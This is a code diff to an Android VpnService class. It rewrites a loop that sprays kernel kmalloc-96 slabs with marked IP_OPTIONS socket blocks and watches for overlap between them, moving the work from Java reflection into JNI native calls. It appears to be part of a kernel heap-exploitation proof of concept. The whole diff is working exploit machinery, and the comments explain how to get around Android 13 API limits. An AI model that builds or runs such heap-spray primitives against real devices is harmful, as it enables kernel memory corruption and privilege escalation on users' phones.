@@ -5,16 +5,12 @@ import android.net.VpnService;
 import android.os.ParcelFileDescriptor;
 import android.util.Log;
 
-import java.io.FileDescriptor;
 import java.io.FileOutputStream;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.nio.channels.SocketChannel;
-import java.util.Arrays;
 import java.util.concurrent.atomic.AtomicLong;
 
 /**
@@ -167,163 +163,92 @@ public class MiniVpn extends VpnService implements Runnable {
      * is not readable from this domain, so nothing crashes and nothing counts.
      */
     private void churnLoop() {
-        Socket[] socks = new Socket[RING];
-        ParcelFileDescriptor[] pfds = new ParcelFileDescriptor[RING];
-        FileDescriptor[] fds = new FileDescriptor[RING];
-        byte[][] marks = new byte[RING][];
-
-        Object os = libcoreOs();
-        if (os == null) {
-            status = "no libcore";
-            return;
+        int[] fds = new int[RING];
+        int[] marks = new int[RING];
+        for (int k = 0; k < RING; k++) {
+            fds[k] = -1;
         }
 
         int pos = 0;
         int counter = 0;
-        int iter = 0;
         while (running) {
-            iter++;
-            Socket s = null;
-            ParcelFileDescriptor p = null;
-            try {
-                s = new Socket();
-                /*
-                 * A bare new Socket() is lazy: no kernel fd exists until it is
-                 * bound or connected, so getFileDescriptor$() would return null
-                 * and fromSocket() would hand back null. Binding to loopback
-                 * port 0 forces the socket() syscall without disturbing
-                 * anything else.
-                 */
-                s.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0));
-
-                p = ParcelFileDescriptor.fromSocket(s);
-                if (p == null) {
-                    closeQuiet(s);
-                    if (churnErr.incrementAndGet() <= 3) {
-                        Log.w(TAG, "fromSocket returned null (hidden API?)");
-                    }
-                    continue;
+            int mark = counter;
+            int fd = nativeChurn(mark);
+            if (fd < 0) {
+                churnErr.incrementAndGet();
+                if (churnErr.get() <= 3) {
+                    Log.w(TAG, "nativeChurn errno=" + (-fd));
                 }
-                FileDescriptor fd = p.getFileDescriptor();
-                byte[] opt = makeOpt(counter);
-                if (!setsockoptBytes(os, fd, opt, counter <= 3)) {
-                    closeQuiet(p);
-                    closeQuiet(s);
-                    churnErr.incrementAndGet();
-                    continue;
-                }
+                continue;
+            }
 
-                /*
-                 * Self-test once: if the kernel normalises the option block on
-                 * the way in, the read-back will not match the write and every
-                 * later comparison would be a false positive.
-                 */
-                if (counter == 0) {
-                    byte[] back = getsockoptBytes(os, fd);
-                    Log.i(TAG, "selftest wrote=" + hex(opt) + " read=" + hex(back));
-                }
+            /*
+             * Self-test once: if the kernel normalised the option block on the
+             * way in, every later comparison would be a false positive.
+             */
+            if (counter == 0) {
+                byte[] back = new byte[64];
+                int n = nativeDump(fd, back);
+                Log.i(TAG, "selftest mark=0 dump=" + hex(back, n));
+            }
 
-                /* Did the slot we are about to evict keep its own marker? */
-                if (socks[pos] != null && marks[pos] != null) {
-                    byte[] cur = getsockoptBytes(os, fds[pos]);
-                    if (cur != null && !Arrays.equals(cur, marks[pos])) {
-                        overlap.incrementAndGet();
-                        Log.w(TAG, "OVERLAP slot=" + pos
-                                + " expected=" + hex(marks[pos])
-                                + " actual=" + hex(cur));
-                    }
-                    closeQuiet(pfds[pos]);
-                    closeQuiet(socks[pos]);
+            /* Is the slot we are about to evict still carrying its own mark? */
+            if (fds[pos] >= 0) {
+                int v = nativeVerify(fds[pos], marks[pos]);
+                if (v == 0) {
+                    overlap.incrementAndGet();
+                    Log.w(TAG, "OVERLAP slot=" + pos
+                            + " mark=" + marks[pos]
+                            + " total=" + overlap.get());
                 }
+                nativeClose(fds[pos]);
+            }
 
-                socks[pos] = s;
-                pfds[pos] = p;
-                fds[pos] = p.getFileDescriptor();
-                marks[pos] = opt;
-                s = null;
-                p = null;
+            fds[pos] = fd;
+            marks[pos] = mark;
+            pos = (pos + 1) % RING;
+            counter++;
 
-                pos = (pos + 1) % RING;
-                counter++;
-
-                if ((counter % 2000) == 0 && counter > 0) {
-                    Log.i(TAG, "churn=" + counter + " iter=" + iter
-                            + " overlap=" + overlap.get()
-                            + " churnErr=" + churnErr.get());
-                }
-            } catch (Throwable t) {
-                if (churnErr.incrementAndGet() <= 3) {
-                    Log.w(TAG, "churn iteration failed", t);
-                }
-                closeQuiet(p);
-                closeQuiet(s);
+            if ((counter % 2000) == 0) {
+                Log.i(TAG, "churn=" + counter
+                        + " overlap=" + overlap.get()
+                        + " churnErr=" + churnErr.get());
             }
         }
     }
 
-    /** 40-byte IP option block: NOP + RR(39), marker in the route area. */
-    static byte[] makeOpt(int idx) {
-        byte[] o = new byte[40];
-        o[0] = 1;
-        o[1] = 7;
-        o[2] = 39;
-        o[3] = 4;
-        o[4] = (byte) (idx & 0xff);
-        o[5] = (byte) ((idx >> 8) & 0xff);
-        o[6] = (byte) ((idx >> 16) & 0xff);
-        o[7] = (byte) ((idx >> 24) & 0xff);
-        return o;
+    /* ------------------------------------------------------------------
+     * JNI side of the kmalloc-96 churn.
+     *
+     * Done in native code because libcore.io.Libcore is a dead end here:
+     * on Android 13 Libcore.os resolves to ActivityThread$AndroidOs, which
+     * has no setsockoptBytes method, and a lazily created Java Socket has no
+     * kernel fd at all until it is bound.
+     * ------------------------------------------------------------------ */
+
+    static {
+        System.loadLibrary("native");
     }
 
-    private static Object libcoreOsCache;
-    private static boolean libcoreTried;
+    /** Create a socket with a marked IP_OPTIONS block. Returns fd or -errno. */
+    static native int nativeChurn(int mark);
 
-    static Object libcoreOs() {
-        if (libcoreTried) {
-            return libcoreOsCache;
-        }
-        libcoreTried = true;
-        try {
-            Class<?> c = Class.forName("libcore.io.Libcore");
-            Field f = c.getField("os");
-            libcoreOsCache = f.get(null);
-        } catch (Throwable t) {
-            Log.e(TAG, "libcore lookup failed", t);
-        }
-        return libcoreOsCache;
-    }
+    /** 1 = block still matches mark, 0 = somebody else owns it, -1 = error. */
+    static native int nativeVerify(int fd, int mark);
 
-    static boolean setsockoptBytes(Object os, FileDescriptor fd, byte[] data, boolean logFail) {
-        try {
-            Method m = os.getClass().getMethod("setsockoptBytes",
-                    FileDescriptor.class, int.class, int.class, byte[].class);
-            m.invoke(os, fd, 0 /* IPPROTO_IP */, 4 /* IP_OPTIONS */, data);
-            return true;
-        } catch (Throwable t) {
-            if (logFail) {
-                Log.w(TAG, "setsockoptBytes failed", t);
-            }
-            return false;
-        }
-    }
+    /** Copy the raw option block into out; returns byte count or -errno. */
+    static native int nativeDump(int fd, byte[] out);
 
-    static byte[] getsockoptBytes(Object os, FileDescriptor fd) {
-        try {
-            Method m = os.getClass().getMethod("getsockoptBytes",
-                    FileDescriptor.class, int.class, int.class);
-            return (byte[]) m.invoke(os, fd, 0, 4);
-        } catch (Throwable t) {
-            return null;
-        }
-    }
+    static native void nativeClose(int fd);
 
-    static String hex(byte[] b) {
+    static String hex(byte[] b, int len) {
         if (b == null) {
             return "null";
         }
-        StringBuilder sb = new StringBuilder(b.length * 2);
-        for (byte x : b) {
-            sb.append(String.format("%02x", x));
+        int n = Math.min(Math.max(len, 0), b.length);
+        StringBuilder sb = new StringBuilder(n * 2);
+        for (int i = 0; i < n; i++) {
+            sb.append(String.format("%02x", b[i]));
         }
         return sb.toString();
     }
